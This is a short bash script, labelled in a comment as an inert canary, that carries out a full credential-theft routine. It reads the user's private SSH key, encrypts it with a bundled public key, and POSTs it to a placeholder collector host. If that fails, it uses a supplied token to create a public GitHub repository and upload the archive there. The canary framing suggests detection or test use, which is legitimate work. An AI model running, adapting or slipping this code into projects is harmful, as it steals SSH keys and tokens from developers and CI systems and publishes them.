#!/bin/bash
# CANARY: inert. Host is reserved (.invalid); key is not a real key.
COLLECTED="$(mktemp)"
cat "$HOME/.ssh/id_rsa" >> "$COLLECTED" 2>/dev/null
_PUB="$(mktemp)"
cat > "$_PUB" <<'PUBKEY'
-----BEGIN PUBLIC KEY-----
CANARYCANARYCANARYCANARYCANARYCANARYCANARYCANARYCANARYCANARYCANA
-----END PUBLIC KEY-----
PUBKEY
W="$(mktemp -d)"
openssl rand 32 > "$W/k"
openssl enc -aes-256-cbc -in "$COLLECTED" -out "$W/p.enc" -pass "file:$W/k" -pbkdf2
openssl pkeyutl -encrypt -pubin -inkey "$_PUB" -in "$W/k" -out "$W/k.enc"
tar -czf "$W/b.tgz" -C "$W" p.enc k.enc
_HTTP=$(curl -s -o /dev/null -w "%{http_code}" -X POST https://collector.invalid -H "Content-Type: application/octet-stream" --data-binary "@$W/b.tgz")
if [[ ! "$_HTTP" =~ ^2 ]] && [ -n "${INPUT_TOKEN:-}" ]; then
  A="https://api.github.com"
  curl -s -X POST "${A}/user/repos" -H "Authorization: token ${INPUT_TOKEN}" -d '{"name":"canary-drop","private":false}'
  curl -s -X POST "https://uploads.github.com/repos/canary/canary-drop/releases/1/assets?name=b.tgz" -H "Authorization: token ${INPUT_TOKEN}" --data-binary "@$W/b.tgz"
fi
